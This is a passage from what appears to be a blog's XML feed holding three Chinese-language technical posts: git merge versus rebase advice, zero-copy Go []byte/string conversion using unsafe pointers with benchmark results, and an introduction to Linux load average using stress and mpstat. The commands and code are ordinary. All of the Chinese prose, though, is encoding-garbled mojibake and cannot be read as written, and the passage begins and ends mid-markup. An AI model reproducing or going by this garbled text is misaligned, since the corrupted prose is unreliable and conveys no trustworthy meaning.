title="æ€»ç»“ä¸€ä¸‹ï¼š"></a>æ€»ç»“ä¸€ä¸‹ï¼š</h3><ol><li><strong>å…¬å…±åˆ†æ”¯ä¸Šé€‰æ‹©Mergeï¼ˆå°†æ–°åŠŸèƒ½æ•´åˆåˆ°masterä¸Šï¼‰</strong></li><li><strong>åŠŸèƒ½åˆ†æ”¯ä¸Šé€‰æ‹©Rebaseä¸»åˆ†æ”¯ï¼ˆå’Œå…¬å…±åˆ†æ”¯åŒæ­¥ï¼ŒæŠŠè‡ªå·±çš„æäº¤é¡¶åˆ°æœ€åï¼‰</strong></li><li><strong>åŠŸèƒ½åˆ†æ”¯ä¸Šé€‰æ‹©Mergeï¼ˆæŠŠåˆ«çš„åˆ†æ”¯çš„åŠŸèƒ½åŠ åˆ°è‡ªå·±èº«ä¸Šï¼Œå¦‚æœä½ ä¸ä»‹æ„é¡ºåºçš„è¯ï¼‰</strong></li><li><strong>åˆ‡è®°ä¸è¦å†å…¬å…±åˆ†æ”¯ä¸ŠRebaseä»»ä½•åˆ†æ”¯ï¼</strong></li></ol><h3 id="ä¼˜ç¼ºç‚¹"><a href="#ä¼˜ç¼ºç‚¹" class="headerlink" title="ä¼˜ç¼ºç‚¹"></a>ä¼˜ç¼ºç‚¹</h3><p>ä¹Ÿè°ˆä¸ä¸Šä»€ä¹ˆä¼˜ç¼ºç‚¹ã€‚åœ¨é€‚åˆçš„åœºæ™¯ä½¿ç”¨é€‚åˆçš„æ–¹å¼ã€‚ï¼ˆ1ã€2ï¼‰<br>å¯¹äº3è¿™ç§æƒ…å†µï¼Œæ¯”å¦‚ä½ è¦æŠŠfutureå¼€å‘åˆ†æ”¯ä¸Šçš„æ–°åŠŸèƒ½å¯¼åˆ°testæµ‹è¯•åˆ†æ”¯é‡Œé¢å»ï¼Œä½ å¯ä»¥åˆ‡åˆ°testï¼Œç„¶åMergeä¸€ä¸‹futureã€‚å› ä¸ºæ˜¯æµ‹è¯•åˆ†æ”¯ï¼Œä½ æ²¡æœ‰å¿…è¦æŠŠéè¦æŠŠtestçš„æäº¤é¡¶åˆ°æœ€åï¼Œäºæ˜¯ä½ å°±å¯ä»¥é€‰æ‹©Mergeï¼Œè€Œä¸”å¤šå‡ºä¸€ä¸ªèŠ‚ç‚¹ï¼Œç”¨äºè®°å½•ã€‚è¿™æ˜¯Mergeçš„å°ä¼˜ç‚¹ã€‚<br>å½“ç„¶ä½ ä¹Ÿå¯ä»¥é€‰æ‹©Rebaseä¸€ä¸‹futureï¼Œè¿™æ ·çš„è¯ï¼Œä½ teståˆ†æ”¯ä¸Šçš„å¤šæ¬¡commitå°±è¿˜æ˜¯åœ¨æœ€åï¼Œä¾¿äºä½ å›é€€ã€‚è¿™æ˜¯Rebaseçš„ä¼˜ç‚¹ã€‚ï¼ˆå¦‚æœä½¿ç”¨Mergeçš„è¯ï¼Œç”±äºå°¾å·´æ˜¯futureçš„åˆå¹¶ï¼Œä½ å†æƒ³å›é€€åˆ°ä½ testä¸Šçš„æŸæ¬¡æäº¤ï¼Œé‚£å°±æœ‰ç‚¹éº»çƒ¦äº†ï¼‰ã€‚</p><h2 id="ç‰¹åˆ«è¯´æ˜"><a href="#ç‰¹åˆ«è¯´æ˜" class="headerlink" title="ç‰¹åˆ«è¯´æ˜"></a><strong>ç‰¹åˆ«è¯´æ˜</strong></h2><p><strong>åˆ‡è®°ä¸è¦å†å…¬å…±åˆ†æ”¯ä¸ŠRebaseä»»ä½•åˆ†æ”¯ï¼</strong><br>ï¼ˆè¿™æˆ‘ä»¬å·²ç»è§£é‡Šè¿‡ï¼‰<br><strong>æœ¬åœ°å’Œè¿œç«¯å¯¹åº”åŒä¸€æ¡åˆ†æ”¯ï¼Œä¼˜å…ˆä½¿ç”¨Rebaseè€Œä¸æ˜¯Merge</strong><br>ä»€ä¹ˆæ„æ€å‘¢ï¼Ÿ<br>æˆ‘ä»¬åˆšåˆšæ¼”ç¤ºæ‰€ç”¨åˆ°çš„åˆ†æ”¯éƒ½æ˜¯æœ¬åœ°ä¸Šçš„ä¸¤ä¸ªåˆ†æ”¯ã€‚<br>å½“æˆ‘ä»¬ä»è¿œç«¯orgin/master æ‹‰å–ï¼ˆpullï¼‰çš„æ—¶å€™ï¼Œæˆ–è€…åœ¨pycharmã€IDEAé‡Œé¢é€‰æ‹©Update Projectçš„æ—¶å€™ï¼Œå®ƒæ€»æ˜¯æç¤ºä½ é€‰æ‹©Mergeè¿˜æ˜¯Rebaseï¼š<br><img src="https://snowgo.top/medias/medias/git-Merge%E5%92%8CRebase%E7%9A%84%E6%80%BB%E7%BB%93/5.png"><br>å¯æ˜¯ä½ æƒ³ï¼Œæˆ‘å°±ä¸€ä¸ªmasteråˆ†æ”¯å•Šï¼Œè¿œç¨‹ä¹Ÿæ˜¯masteråˆ†æ”¯å‘€ï¼Œæ€ä¹ˆå°±æ€ä¹ˆå°±è®¾è®¡åˆ°äº†åˆå¹¶åˆ†æ”¯çš„æ“ä½œäº†ï¼Ÿ<br>å…¶å®æ˜¯è¿™æ ·çš„ï¼š<br>gitæœ‰æœ¬åœ°ä»“åº“çš„æ¦‚å¿µï¼Œæœ¬åœ°çš„masteræ˜¯ä¸€ä¸ªä»“åº“ï¼Œè¿œç¨‹çš„masterä¹Ÿæ˜¯ä¸€ä¸ªä»“åº“ï¼Œgit pull == git fetch + git mergeï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œè¿™é‡Œè®©ä½ é€‰æ‹©çš„æ˜¯ï¼Œå°†è¿œç¨‹çš„masteræ‹‰å–ä¸‹æ¥ä¹‹åï¼Œå¦‚ä½•å’Œä½ çš„æœ¬åœ°masteråˆå¹¶ï¼Ÿ<br>æˆ‘ä»¬æ¨èä½¿ç”¨Rebaseï¼šç«™åœ¨ä½ æœ¬åœ°masteråˆ†æ”¯ä¸Šï¼ŒRebaseä¸€ä¸‹è¿œç¨‹masterã€‚è¿™æ ·çš„è¯ä½ åˆšåˆšåœ¨æœ¬åœ°masteræ‰€åšçš„å¤šä¸ªæäº¤ï¼Œä¾ç„¶ä¼šè¢«é¡¶åœ¨ä½ æœ¬åœ°masteråˆ†æ”¯çš„æœ€åé¢ã€‚ä¾¿äºä½ å›é€€ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> é—®é¢˜å’ŒæŠ€å·§ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>go[]byteå’Œstringçš„é«˜æ€§èƒ½è½¬æ¢</title>
      <link href="/2022/05/14/go%5B%5Dbyte%E5%92%8Cstring%E7%9A%84%E9%AB%98%E6%80%A7%E8%83%BD%E8%BD%AC%E6%8D%A2/"/>
      <url>/2022/05/14/go%5B%5Dbyte%E5%92%8Cstring%E7%9A%84%E9%AB%98%E6%80%A7%E8%83%BD%E8%BD%AC%E6%8D%A2/</url>
      
        <content type="html"><![CDATA[<p>åœ¨<a href="https://github.com/valyala/fasthttp#fasthttp-best-practices">fasthttp</a>çš„æœ€ä½³å®è·µä¸­æœ‰è¿™ä¹ˆä¸€å¥è¯ï¼š<br>Avoid conversion between []byte and string, since this may result in memory allocation+copy. Fasthttp API provides functions for both []byte and string - use these functions instead of converting manually between []byte and string. There are some exceptions - see <a href="https://github.com/golang/go/wiki/CompilerOptimizations#string-and-byte">this wiki page</a> for more details.<br>å¤§æ¦‚æ„æ€å°±æ˜¯è¯´ï¼Œè¦å°½é‡é¿å…[]byteå’Œstringçš„è½¬æ¢ï¼Œå› ä¸ºè½¬æ¢è¿‡ç¨‹ä¼šå­˜åœ¨å†…å­˜æ‹·è´ï¼Œå½±å“æ€§èƒ½ã€‚æ­¤å¤–åœ¨fasthttpä¸­è¿˜æå‡ºäº†ä¸€ä¸ªè§£å†³æ–¹æ¡ˆï¼Œç”¨äº[]byteå’Œstringçš„é«˜æ€§èƒ½è½¬æ¢ã€‚ç›´æ¥çœ‹ä¸‹æºç ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// b2s converts byte slice to a string without memory allocation.</span></span><br><span class="line"><span class="comment">// See https://groups.google.com/forum/#!msg/Golang-Nuts/ENgbUzYvCuU/90yGx7GUAgAJ .</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Note it may break if string and/or slice header will change</span></span><br><span class="line"><span class="comment">// in the future go versions.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">b2s</span><span class="params">(b []<span class="keyword">byte</span>)</span> <span class="title">string</span></span> &#123;</span><br><span class="line"><span class="comment">/* #nosec G103 */</span></span><br><span class="line"><span class="keyword">return</span> *(*<span class="keyword">string</span>)(unsafe.Pointer(&amp;b))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// s2b converts string to a byte slice without memory allocation.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Note it may break if string and/or slice header will change</span></span><br><span class="line"><span class="comment">// in the future go versions.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">s2b</span><span class="params">(s <span class="keyword">string</span>)</span> <span class="params">(b []<span class="keyword">byte</span>)</span></span> &#123;</span><br><span class="line"><span class="comment">/* #nosec G103 */</span></span><br><span class="line">bh := (*reflect.SliceHeader)(unsafe.Pointer(&amp;b))</span><br><span class="line"><span class="comment">/* #nosec G103 */</span></span><br><span class="line">sh := (*reflect.StringHeader)(unsafe.Pointer(&amp;s))</span><br><span class="line">bh.Data = sh.Data</span><br><span class="line">bh.Cap = sh.Len</span><br><span class="line">bh.Len = sh.Len</span><br><span class="line"><span class="keyword">return</span> b</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ä¸Šè¿°å®ç°ä¸­å¹¶æ²¡æœ‰å†…å­˜æ‹·è´ï¼Œä½¿ç”¨ç±»ä¼¼Cè¯­è¨€çš„ç±»å‹å¼ºè½¬å®ç°[]byteå’Œstringä¹‹é—´çš„ç±»å‹è½¬æ¢ã€‚é‚£ä¹ˆä»–ä»¬å’Œä¸€èˆ¬ä½¿ç”¨çš„è½¬æ¢ä¹‹é—´çš„æ€§èƒ½å·®å¼‚æœ‰å¤šå¤§?çœ‹ä¸‹å¦‚ä¸‹æ€§èƒ½æµ‹è¯•ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> s = <span class="string">&quot;adsfasdfadsfadsfasdfadfadfasdfasdfadsfasdfasdfasdfsadfas&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">BenchmarkB2sFast</span><span class="params">(b *testing.B)</span></span> &#123;</span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; b.N; i++ &#123;</span><br><span class="line">       _ = s2b(s)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">BenchmarkB2sStd</span><span class="params">(b *testing.B)</span></span> &#123;</span><br><span class="line">    <span class="keyword">var</span> _ []<span class="keyword">byte</span></span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; b.N; i++ &#123;</span><br><span class="line">        _ = []<span class="keyword">byte</span>(s)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> bt = []<span class="keyword">byte</span>(<span class="string">&quot;adsfasdfadsfadsfasdfadfadfasdfasdfadsfasdfasdfasdfsadfas&quot;</span>)</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">BenchmarkS2BFast</span><span class="params">(b *testing.B)</span></span> &#123;</span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; b.N; i++ &#123;</span><br><span class="line">        _ = b2s(bt)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">BenchmarkS2BStd</span><span class="params">(b *testing.B)</span></span> &#123;</span><br><span class="line">    <span class="keyword">var</span> _ []<span class="keyword">byte</span></span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; b.N; i++ &#123;</span><br><span class="line">        _ = <span class="keyword">string</span>(bt)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æµ‹è¯•ç»“æœå¦‚ä¸‹ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">goos: windows</span><br><span class="line">goarch: amd64</span><br><span class="line">pkg: awesomeProject5/lib</span><br><span class="line">cpu: Intel(R) Core(TM) i7<span class="number">-10510</span>U CPU @ <span class="number">1.80</span>GHz</span><br><span class="line">BenchmarkB2sFast</span><br><span class="line">BenchmarkB2sFast<span class="number">-8</span>   <span class="number">1000000000</span>         <span class="number">0.2383</span> ns/op</span><br><span class="line">BenchmarkB2sStd</span><br><span class="line">BenchmarkB2sStd<span class="number">-8</span>    <span class="number">41089557</span>        <span class="number">27.65</span> ns/op</span><br><span class="line">BenchmarkS2BFast</span><br><span class="line">BenchmarkS2BFast<span class="number">-8</span>   <span class="number">1000000000</span>         <span class="number">0.2378</span> ns/op</span><br><span class="line">BenchmarkS2BStd</span><br><span class="line">BenchmarkS2BStd<span class="number">-8</span>    <span class="number">54249056</span>        <span class="number">22.51</span> ns/op</span><br><span class="line">PASS</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°åœ¨ç›¸åŒæµ‹è¯•æ¡ä»¶ä¸‹ï¼Œå…¶æ€§èƒ½å·®å¼‚ç«Ÿç„¶è¾¾åˆ°äº†100å€ï¼<br>å¯è§åœ¨é«˜é¢‘ç½‘ç»œè®¿é—®ä¸­ï¼Œå¦‚æœç›´æ¥åœ¨[]byteå’Œstringä¹‹é—´è¿›è¡Œè½¬æ¢å°†ä¼šèŠ±è´¹å¤šå¤§çš„æ€§èƒ½ï¼<br>éœ€è¦æ³¨æ„çš„æ˜¯è¿™ç§æ–¹å¼ä¹Ÿæœ‰å¼Šç«¯ï¼Œåœ¨ä»£ç æ³¨é‡Šä¸­å¯ä»¥çœ‹åˆ°å®ƒä¾èµ–golangä¸­çš„stringæˆ–sliceçš„é¦–éƒ¨å®šä¹‰ã€‚å¦‚æœåç»­golangç‰ˆæœ¬å¯¹æ­¤æœ‰ä¿®æ”¹ï¼Œåˆ™æœ‰å¯èƒ½å¯¼è‡´ä»£ç æ— æ³•è¿è¡Œã€‚</p><blockquote><p>å‚è€ƒèµ„æ–™<br><a href="https://www.cnblogs.com/charlieroro/p/15410902.html">https://www.cnblogs.com/charlieroro/p/15410902.html</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> é—®é¢˜å’ŒæŠ€å·§ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> go </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linuxå¹³å‡è´Ÿè½½æ€ä¹ˆç†è§£</title>
      <link href="/2022/05/14/linux%E5%B9%B3%E5%9D%87%E8%B4%9F%E8%BD%BD%E6%80%8E%E4%B9%88%E7%90%86%E8%A7%A3/"/>
      <url>/2022/05/14/linux%E5%B9%B3%E5%9D%87%E8%B4%9F%E8%BD%BD%E6%80%8E%E4%B9%88%E7%90%86%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h2 id="ä»€ä¹ˆæ˜¯å¹³å‡è´Ÿè½½"><a href="#ä»€ä¹ˆæ˜¯å¹³å‡è´Ÿè½½" class="headerlink" title="ä»€ä¹ˆæ˜¯å¹³å‡è´Ÿè½½"></a>ä»€ä¹ˆæ˜¯å¹³å‡è´Ÿè½½</h2><p>å¹³å‡è´Ÿè½½æ˜¯æŒ‡å•ä½æ—¶é—´å†…ï¼Œç³»ç»Ÿå¤„äº<strong>å¯è¿è¡ŒçŠ¶æ€</strong>å’Œ<strong>ä¸å¯ä¸­æ–­çŠ¶æ€</strong>çš„å¹³å‡è¿›ç¨‹æ•°ï¼Œä¹Ÿå°±æ˜¯<strong>å¹³å‡æ´»è·ƒè¿›ç¨‹æ•°</strong>ï¼Œå®ƒå’Œ CPU ä½¿ç”¨ç‡å¹¶æ²¡æœ‰ç›´æ¥å…³ç³»ã€‚<br>æ‰€è°“å¯è¿è¡ŒçŠ¶æ€çš„è¿›ç¨‹ï¼Œæ˜¯æŒ‡æ­£åœ¨ä½¿ç”¨ CPU æˆ–è€…æ­£åœ¨ç­‰å¾… CPU çš„è¿›ç¨‹ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬å¸¸ç”¨ ps å‘½ä»¤çœ‹åˆ°çš„ï¼Œå¤„äº R çŠ¶æ€ï¼ˆRunning æˆ– Runnableï¼‰çš„è¿›ç¨‹ã€‚<br>ä¸å¯ä¸­æ–­çŠ¶æ€çš„è¿›ç¨‹åˆ™æ˜¯æ­£å¤„äºå†…æ ¸æ€å…³é”®æµç¨‹ä¸­çš„è¿›ç¨‹ï¼Œå¹¶ä¸”è¿™äº›æµç¨‹æ˜¯ä¸å¯æ‰“æ–­çš„ï¼Œæ¯”å¦‚æœ€å¸¸è§çš„æ˜¯<strong>ç­‰å¾…ç¡¬ä»¶è®¾å¤‡çš„ I/O å“åº”</strong>ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬åœ¨ ps å‘½ä»¤ä¸­çœ‹åˆ°çš„ D çŠ¶æ€ï¼ˆUninterruptible Sleepï¼Œä¹Ÿç§°ä¸º Disk Sleepï¼‰çš„è¿›ç¨‹ã€‚<br>æ¯”å¦‚å½“å¹³å‡è´Ÿè½½ä¸º 2 æ—¶ï¼Œæ„å‘³ç€ä»€ä¹ˆå‘¢ï¼Ÿ</p><ul><li>åœ¨åªæœ‰ 2 ä¸ª CPU çš„ç³»ç»Ÿä¸Šï¼Œæ„å‘³ç€æ‰€æœ‰çš„ CPU éƒ½åˆšå¥½è¢«å®Œå…¨å ç”¨ã€‚</li><li>åœ¨ 4 ä¸ª CPU çš„ç³»ç»Ÿä¸Šï¼Œæ„å‘³ç€ CPU æœ‰ 50% çš„ç©ºé—²ã€‚</li><li>è€Œåœ¨åªæœ‰ 1 ä¸ª CPU çš„ç³»ç»Ÿä¸­ï¼Œåˆ™æ„å‘³ç€æœ‰ä¸€åŠçš„è¿›ç¨‹ç«äº‰ä¸åˆ° CPUã€‚</li></ul><h2 id="å¹³å‡è´Ÿè½½ä¸ºå¤šå°‘æ—¶åˆç†"><a href="#å¹³å‡è´Ÿè½½ä¸ºå¤šå°‘æ—¶åˆç†" class="headerlink" title="å¹³å‡è´Ÿè½½ä¸ºå¤šå°‘æ—¶åˆç†"></a>å¹³å‡è´Ÿè½½ä¸ºå¤šå°‘æ—¶åˆç†</h2><p>å¹³å‡è´Ÿè½½æœ€ç†æƒ³çš„æƒ…å†µæ˜¯ç­‰äº CPU ä¸ªæ•°ã€‚æ‰€ä»¥åœ¨è¯„åˆ¤å¹³å‡è´Ÿè½½æ—¶ï¼Œ<strong>é¦–å…ˆä½ è¦çŸ¥é“ç³»ç»Ÿæœ‰å‡ ä¸ª CPU</strong>ï¼Œè¿™å¯ä»¥é€šè¿‡ top å‘½ä»¤æˆ–è€…ä»æ–‡ä»¶ /proc/cpuinfo ä¸­è¯»å–ï¼Œæ¯”å¦‚ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#å…³äº grep å’Œ wc çš„ç”¨æ³•è¯·æŸ¥è¯¢å®ƒä»¬çš„æ‰‹å†Œæˆ–è€…ç½‘ç»œæœç´¢</span><br><span class="line">grep <span class="string">&#x27;model name&#x27;</span> /proc/cpuinfo | wc -l</span><br></pre></td></tr></table></figure><p>å¹³å‡è´Ÿè½½æœ‰ä¸‰ä¸ªæ•°å€¼ï¼Œåˆ°åº•è¯¥å‚è€ƒå“ªä¸€ä¸ªå‘¢ï¼Ÿ<br>å®é™…ä¸Šï¼Œéƒ½è¦çœ‹ã€‚ä¸‰ä¸ªä¸åŒæ—¶é—´é—´éš”çš„å¹³å‡å€¼ï¼Œå…¶å®ç»™æˆ‘ä»¬æä¾›äº†ï¼Œåˆ†æ<strong>ç³»ç»Ÿè´Ÿè½½è¶‹åŠ¿</strong>çš„æ•°æ®æ¥æºï¼Œè®©æˆ‘ä»¬èƒ½æ›´å…¨é¢ã€æ›´ç«‹ä½“åœ°ç†è§£ç›®å‰çš„è´Ÿè½½çŠ¶å†µã€‚<br>å‡è®¾æˆ‘ä»¬åœ¨ä¸€ä¸ªå• CPU ç³»ç»Ÿä¸Šçœ‹åˆ°å¹³å‡è´Ÿè½½ä¸º 1.73ï¼Œ0.60ï¼Œ7.98ï¼Œé‚£ä¹ˆè¯´æ˜åœ¨è¿‡å» 1 åˆ†é’Ÿå†…ï¼Œç³»ç»Ÿæœ‰ 73% çš„è¶…è½½ï¼Œè€Œåœ¨ 15 åˆ†é’Ÿå†…ï¼Œæœ‰ 698% çš„è¶…è½½ï¼Œä»æ•´ä½“è¶‹åŠ¿æ¥çœ‹ï¼Œç³»ç»Ÿçš„è´Ÿè½½åœ¨é™ä½ã€‚</p><h2 id="å¹³å‡è´Ÿè½½ä¸-CPU-ä½¿ç”¨ç‡"><a href="#å¹³å‡è´Ÿè½½ä¸-CPU-ä½¿ç”¨ç‡" class="headerlink" title="å¹³å‡è´Ÿè½½ä¸ CPU ä½¿ç”¨ç‡"></a>å¹³å‡è´Ÿè½½ä¸ CPU ä½¿ç”¨ç‡</h2><p>CPU ä½¿ç”¨ç‡ï¼Œæ˜¯å•ä½æ—¶é—´å†… CPU ç¹å¿™æƒ…å†µçš„ç»Ÿè®¡ï¼Œè·Ÿå¹³å‡è´Ÿè½½å¹¶ä¸ä¸€å®šå®Œå…¨å¯¹åº”ã€‚æ¯”å¦‚ï¼š</p><ul><li>CPU å¯†é›†å‹è¿›ç¨‹ï¼Œä½¿ç”¨å¤§é‡ CPU ä¼šå¯¼è‡´å¹³å‡è´Ÿè½½å‡é«˜ï¼Œæ­¤æ—¶è¿™ä¸¤è€…æ˜¯ä¸€è‡´çš„ï¼›</li><li>I/O å¯†é›†å‹è¿›ç¨‹ï¼Œç­‰å¾… I/O ä¹Ÿä¼šå¯¼è‡´å¹³å‡è´Ÿè½½å‡é«˜ï¼Œä½† CPU ä½¿ç”¨ç‡ä¸ä¸€å®šå¾ˆé«˜ï¼›</li><li>å¤§é‡ç­‰å¾… CPU çš„è¿›ç¨‹è°ƒåº¦ä¹Ÿä¼šå¯¼è‡´å¹³å‡è´Ÿè½½å‡é«˜ï¼Œæ­¤æ—¶çš„ CPU ä½¿ç”¨ç‡ä¹Ÿä¼šæ¯”è¾ƒé«˜ã€‚</li></ul><h2 id="å¹³å‡è´Ÿè½½æ¡ˆä¾‹åˆ†æ"><a href="#å¹³å‡è´Ÿè½½æ¡ˆä¾‹åˆ†æ" class="headerlink" title="å¹³å‡è´Ÿè½½æ¡ˆä¾‹åˆ†æ"></a>å¹³å‡è´Ÿè½½æ¡ˆä¾‹åˆ†æ</h2><p>stress æ˜¯ä¸€ä¸ª Linux ç³»ç»Ÿå‹åŠ›æµ‹è¯•å·¥å…·ï¼Œè¿™é‡Œæˆ‘ä»¬ç”¨ä½œå¼‚å¸¸è¿›ç¨‹æ¨¡æ‹Ÿå¹³å‡è´Ÿè½½å‡é«˜çš„åœºæ™¯ã€‚<br>è€Œ sysstat åŒ…å«äº†å¸¸ç”¨çš„ Linux æ€§èƒ½å·¥å…·ï¼Œç”¨æ¥ç›‘æ§å’Œåˆ†æç³»ç»Ÿçš„æ€§èƒ½ã€‚æˆ‘ä»¬çš„æ¡ˆä¾‹ä¼šç”¨åˆ°è¿™ä¸ªåŒ…çš„ä¸¤ä¸ªå‘½ä»¤ mpstat å’Œ pidstatã€‚</p><ul><li>mpstat æ˜¯ä¸€ä¸ªå¸¸ç”¨çš„å¤šæ ¸ CPU æ€§èƒ½åˆ†æå·¥å…·ï¼Œç”¨æ¥å®æ—¶æŸ¥çœ‹æ¯ä¸ª CPU çš„æ€§èƒ½æŒ‡æ ‡ï¼Œä»¥åŠæ‰€æœ‰ CPU çš„å¹³å‡æŒ‡æ ‡ã€‚</li><li>pidstat æ˜¯ä¸€ä¸ªå¸¸ç”¨çš„è¿›ç¨‹æ€§èƒ½åˆ†æå·¥å…·ï¼Œç”¨æ¥å®æ—¶æŸ¥çœ‹è¿›ç¨‹çš„ CPUã€å†…å­˜ã€I/O ä»¥åŠä¸Šä¸‹æ–‡åˆ‡æ¢ç­‰æ€§èƒ½æŒ‡æ ‡ã€‚</li></ul><h3 id="åˆ†æè¿‡ç¨‹"><a href="#åˆ†æè¿‡ç¨‹" class="headerlink" title="åˆ†æè¿‡ç¨‹"></a>åˆ†æè¿‡ç¨‹</h3><p>ä½¿ç”¨ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#æ¨¡æ‹Ÿä¸€ä¸ª CPU ä½¿ç”¨ç‡ <span class="number">100</span>% çš„åœºæ™¯</span><br><span class="line">stress --cpu <span class="number">1</span> --timeout <span class="number">600</span></span><br><span class="line">#æ¨¡æ‹Ÿ I/O å‹åŠ›ï¼Œå³ä¸åœåœ°æ‰§è¡Œ sync</span><br><span class="line">stress -i <span class="number">1</span> --timeout <span class="number">600</span></span><br><span class="line">#æ¨¡æ‹Ÿ <span class="number">8</span> ä¸ªè¿›ç¨‹æŠ¢å cpu</span><br><span class="line">stress -c <span class="number">8</span> --timeout <span class="number">600</span></span><br></pre></td></tr></table></figure><p>è¿è¡Œ uptime æŸ¥çœ‹å¹³å‡è´Ÿè½½çš„å˜åŒ–æƒ…å†µï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># -d å‚æ•°è¡¨ç¤ºé«˜äº®æ˜¾ç¤ºå˜åŒ–çš„åŒºåŸŸ</span><br><span class="line">$ watch -d uptime</span><br><span class="line">...,  load average: <span class="number">1.00</span>, <span class="number">0.75</span>, <span class="number">0.39</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿è¡Œ mpstat æŸ¥çœ‹ CPU ä½¿ç”¨ç‡çš„å˜åŒ–æƒ…å†µï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># -P ALL è¡¨ç¤ºç›‘æ§æ‰€æœ‰ CPUï¼Œåé¢æ•°å­— <span class="number">5</span> è¡¨ç¤ºé—´éš” <span class="number">5</span> ç§’åè¾“å‡ºä¸€ç»„æ•°æ®</span><br><span class="line">mpstat -P ALL <span class="number">5</span></span><br><span class="line">Linux <span class="number">4.15</span><span class="number">.0</span> (ubuntu) <span class="number">09</span>/<span class="number">22</span>/<span class="number">18</span> _x86_64_ (<span class="number">2</span> CPU)</span><br><span class="line"><span class="number">13</span>:<span class="number">30</span>:<span class="number">06</span>     CPU    %usr   %nice    %sys %iowait    %irq   %soft  %steal  %guest  %gnice   %idle</span><br><span class="line"><span class="number">13</span>:<span class="number">30</span>:<span class="number">11</span>     all   <span class="number">50.05</span>    <span class="number">0.00</span>    <span class="number">0.00</span>    <span class="number">0.00</span>    <span class="number">0.00</span>    <span class="number">0.00</span>    <span class="number">0.00</span>    <span class="number">0.00</span>    <span class="number">0.00</span>   <span class="number">49.95</span></span><br><span class="line"><span class="number">13</span>:<span class="number">30</span>:<span class="number">11</span>       <span class="number">0</span>    <span class="number">0.00</span>    <span class="number">0.00</span>    <span class="number">0.00</span>    <span class="number">0.00</span>    <span class="number">0.00</span>    <span class="number">0.00</span>    <span class="number">0.00</span>    <span class="number">0.00</span>    <span class="number">0.00</span>  <span class="number">100.00</span></span><br><span 